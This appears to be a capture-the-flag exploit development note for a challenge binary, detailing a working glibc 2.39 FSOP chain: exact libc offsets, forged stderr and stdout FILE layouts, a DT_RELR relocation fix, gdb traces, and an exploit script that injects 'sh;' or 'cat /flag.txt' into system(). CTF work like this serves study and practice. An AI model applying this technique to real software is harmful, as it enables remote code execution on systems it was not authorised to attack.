# LANE-C — 9164 Phantom Device: stdout fix, exit() reached, FSOP → system() PROVEN

Date: 2026-11-08. Host: local harness (`files/client` + `work/libdir_ubuntu`, GLIBC 2.39-0ubuntu8.9).
Deliverable: `work/exploit_local.py` (runs end to end), this file (exact offsets).

## Outcome

`python3 exploit_local.py` now completes the whole chain and prints whatever the injected
command writes to fd 2:

```
=== 1. harmless marker (direct) ===
FSOP_OK                       <- system("  echo FSOP_OK >&2") from _IO_flush_all

=== 2. sh mode with flag file ===
CSCTF{lanec_local_marker_1234}
[+] FLAG: CSCTF{lanec_local_marker_1234}

=== 3./4. direct mode, repeated ===
CSCTF{lanec_local_marker_1234}   (twice, rc=0)
```

gdb proof of the path (breakpoints on _IO_cleanup / _IO_flush_all / _IO_wfile_overflow /
system / _IO_file_doallocate):

```
LIBC BASE 0x7ffff7d7d000
DOALLOCATE fp=0x7ffff7f825c0 flags=0xfbad2084 fileno=1    <- 1st printf, real stdout
EXIT                                                       <- puts("EXIT") survived
IO_CLEANUP
FLUSH_ALL  _IO_list_all=0x7ffff7f824e0                     <- &_IO_2_1_stderr_ (fake)
WOVERFLOW fp=0x7ffff7f824e0 flags=0x68732020 mode=1 wd=0x7ffff7f825e0
           wwb=(nil) wwp=0x1 wbuf=(nil) wvt=0x7ffff7f82660
SYSTEM(  sh;)
```

Note: the `fprintf(stderr, ...)` that `afc_receive_data` performs on the unknown op 0x99 does
NOT trigger anything (it returns without touching `_IO_wfile_xsputn`); the trigger is exclusively
`exit() -> _IO_cleanup -> _IO_flush_all`. No need to reason about the fprintf path at all.

## Blocker 1 (the one we were asked to fix): puts("EXIT") on the rebuilt stdout

The 0x2c0-byte fake stderr block at `_IO_2_1_stderr_` also covers `_IO_2_1_stdout_`, which is only
0xe0 above it, so the image zeroes the whole stdout FILE. Without a fix, `puts("EXIT")` ->
`_IO_file_xsputn` -> `_IO_file_overflow` -> `_IO_doallocbuf` -> `_IO_file_doallocate` ->
`malloc(BUFSIZ)` hits the `main_arena` this same write replaced with the static (all-zero) file
image -> SIGSEGV inside `puts` (observed at `libc+puts`, bt `#0 puts`), `exit()` never runs.

Two attempts, one works:

- **UNBUFFERED / `_shortbuf` (FAILS).** `_IO_UNBUFFERED` makes `_IO_doallocbuf` use
  `fp->_shortbuf` (stdout+0x83), but `_IO_setb` then stores `shortbuf`/`shortbuf+1` into
  stdout+0x38/0x40 — and those two addresses ARE the fake stderr's
  `_wide_data->_IO_write_base/_IO_write_ptr` (the FILEs are 0xe0 apart). gdb showed
  `wwb=0x...82643 wwp=0x...82644`, so `_IO_wfile_overflow` saw `_IO_write_base != 0`, skipped
  `_IO_wdoallocbuf` and no `system()` ran.
- **Pre-buffered stdout (WORKS).** Give stdout the 0x1000 stdio buffer it already owns,
  `heap+0x2a0` (verified: `*(libc+0x2055c0+0x38) == heap+0x2a0`, `+0x40 == heap+0x12a0`), with
  `write_end > write_ptr` so `puts()` just memcpy's and `fflush(stdout)` goes through
  `new_do_write` (read_end == write_base avoids the lseek) and then resets
  `write_base = write_ptr = buf_base = 0`, `write_end = buf_end = 1` — exactly the 0/1 the FSOP
  needs in `_wide_data`. No malloc is ever called.

## Blocker 2 (discovered while validating): the .data image was not relocated

This libc uses **DT_RELR** (`-z pack-relative-relocs`; dynamic tags 36/35/37 at vaddr 0x27290,
size 0x100, ent 8). `libc_image()` only replayed `SHT_RELA`, so every packed pointer in the image
kept its link-time value — e.g. `__exit_funcs` = `0x205fc0` instead of `libc+0x205fc0`. Result:
`exit()` crashed in `__run_exit_handlers` at `libc+0x47968` (`mov 0x8(%r15),%rax`) before
`_IO_cleanup`. Fix: walk the RELR table (99 words inside our range) and add `libc` to each word,
exactly like the loader. `__exit_funcs` then points at the (zeroed, out-of-image) `initial` list,
the exit-function loop ends immediately and `RUN_HOOK(__libc_atexit)` calls `_IO_cleanup`.

## Exact image and byte offsets

The R13 reply is `entire_length = 0x20` (`malloc(0x20)` pops the poisoned 0x30 bin entry =
`target`) and `this_length = 0x15b0`, so 5552 bytes land at

```
I = libc + 0x2041f0      image length 0x15b0 (covers 0x2041f0 .. 0x2057a0)
```

The image is libc's file bytes for that range with `.rela.dyn` (type 8/1) and `DT_RELR` rebased.
On top of it:

Note: the chunk header that `free(buf)` reads sits at `I-8 = libc+0x2041e8` (inside `mp_`, outside
the image), where the running libc has size `0x40`; the free therefore goes to the 0x40 tcache bin
and only touches `I .. I+0x10`, i.e. the front of the image, not the FILE.

### Fake stderr `_IO_2_1_stderr_`

`S = libc + 0x2054e0`, block `S .. S+0x2c0` (image offset `0x12f0`):

| VA | image off | field | value |
|---|---|---|---|
| S+0x000 | 0x12f0 | `_flags` / command bytes | command string, must start `"  "` (first byte 0x20 keeps `_IO_NO_WRITES`=0x08, `_IO_UNBUFFERED`=0x02, `_IO_USER_LOCK`=0x8000 clear) |
| S+0x068 | 0x1358 | `_chain` | 0 (ends the `_IO_flush_all` walk) |
| S+0x080 | 0x1370 | `_vtable_offset` | 0 |
| S+0x088 | 0x1378 | `_lock` | `S+0x2a0` = libc+0x205780 (zeroed lock inside the image) |
| S+0x0a0 | 0x1390 | `_wide_data` | `S+0x100` = libc+0x2055e0 |
| S+0x0c0 | 0x13b0 | `_mode` | 1 |
| S+0x0d8 | 0x13c8 | `vtable` | libc+0x203228 (`_IO_wfile_jumps`) |
| S+0x118 | 0x1408 | WD+0x18 `_IO_write_base` | 0 |
| S+0x120 | 0x1410 | WD+0x20 `_IO_write_ptr` | 1 |
| S+0x130 | 0x1420 | WD+0x30 `_IO_buf_base` | 0 |
| S+0x1e0 | 0x14d0 | WD+0xe0 `_wide_vtable` | `S+0x180` = libc+0x205660 |
| S+0x1e8 | 0x14d8 | VT+0x68 `__doallocate` | libc+0x58750 (`system`) |

### `_IO_list_all`

| VA | image off | value |
|---|---|---|
| libc+0x2054c0 | 0x12d0 | libc+0x2054e0 (`&_IO_2_1_stderr_`) |

### `_IO_2_1_stdout_` (written AFTER the fake block, which zeroes it)

`O = libc + 0x2055c0` = `S+0xe0` (image offset `0x13d0`), and `BUF = heap + 0x2a0`:

| VA | image off | field | value |
|---|---|---|---|
| O+0x000 | 0x13d0 | `_flags` | `0xfbad2084` (static, NO `_IO_UNBUFFERED`) |
| O+0x008 | 0x13d8 | `_IO_read_ptr` | 0 |
| O+0x010 | 0x13e0 | `_IO_read_end` | `BUF` (== `_IO_write_base`, avoids a seek in `new_do_write`) |
| O+0x018 | 0x13e8 | `_IO_read_base` | 0 |
| O+0x020 | 0x13f0 | `_IO_write_base` | `BUF` |
| O+0x028 | 0x13f8 | `_IO_write_ptr` | `BUF` |
| O+0x030 | 0x1400 | `_IO_write_end` | `BUF+0x1000` |
| O+0x038 | 0x1408 | `_IO_buf_base` | **0** (aliases fake `WD+0x18`) |
| O+0x040 | 0x1410 | `_IO_buf_end` | **not written — must stay 1** (aliases fake `WD+0x20`) |
| O+0x048 | 0x1418 | `_IO_save_base` | 0 |
| O+0x050 | 0x1420 | `_IO_backup_base` | 0 (aliases fake `WD+0x30`) |
| O+0x058 | 0x1428 | `_IO_save_end` | 0 |
| O+0x060 | 0x1430 | `_markers` | 0 |
| O+0x068 | 0x1438 | `_chain` | 0 |
| O+0x070 | 0x1440 | `_fileno` | 1 |
| O+0x074 | 0x1444 | `_flags2` | 0 |
| O+0x088 | 0x1458 | `_lock` | libc+0x206710 (`_IO_stdfile_1_lock`) |
| O+0x0a0 | 0x1470 | `_wide_data` | libc+0x2047e0 (static `_IO_wide_data_1`) |
| O+0x0c0 | 0x1490 | `_mode` | 0 |
| O+0x0d8 | 0x14a8 | `vtable` | libc+0x203030 (`_IO_file_jumps`) |

Aliasing is the trap: `O+0x38 = S+0x118`, `O+0x40 = S+0x120`, `O+0x50 = S+0x130`. Values must end
up 0 / 1 / 0. The fake block also zeroes `_IO_2_1_stdin_` (`S+0x1c0 .. S+0x2a0`), harmless because
`stderr._chain = 0` means `_IO_flush_all` never walks past the fake stderr.

## Why the trigger fires

`_IO_flush_all_lockp`: `fp->_mode (1) > 0` and `fp->_wide_data->_IO_write_ptr (1) >
_IO_write_base (0)` (vtable offset 0, so the wide branch is taken) -> `_IO_OVERFLOW(fp, EOF)` ->
`_IO_wfile_overflow` -> `_IO_wdoallocbuf` (wide `_IO_buf_base == 0`, no `_IO_UNBUFFERED`) ->
`_IO_WDOALLOCATE` -> `*(wide_vtable+0x68)(fp)` = `system(fp)`, and `fp` is the FILE itself, whose
first bytes are the command: `system("  sh;")` / `system("  cat /flag.txt >&2; ...")`.

## Files

- `work/exploit_local.py` — end-to-end exploit. Default `--cmd 'cat /flag.txt >&2; echo __DONE__ >&2'`
  runs the command directly through `system()`; `--sh` injects `"  sh;"` and feeds `--cmd` on the
  client's stdin (the live-plan shape). `-v` also verifies `heap+0x2a0` against the real stdout
  buffer via /proc and checks the rebuilt stdout vtable.
- `work/g_lanec.gdb`, `work/g_lanec.sh` — gdb trace used for the proof.
- `work/t/lanec_dump2.py`, `lanec_layout.py`, `lanec_exitfuncs.py`, `lanec_relr.py`,
  `lanec_imgcheck.py` — libc layout / RELR / image-field probes.

## Local vs live

The local test uses `/tmp/flag9164.txt` (uid 1000 cannot create `/flag.txt`); on the target the
default command is `cat /flag.txt >&2`. The client binary and libc are the challenge's own, so the
heap layout is identical: `heap+0x2a0` is stdout's buffer (allocated by the first `printf`, before
R6), and the heap base comes from the R7 leak. On the socket, fd 2 is the socket, so `system()`'s
output (and `--sh` reading commands from fd 0) go straight back to the driver.
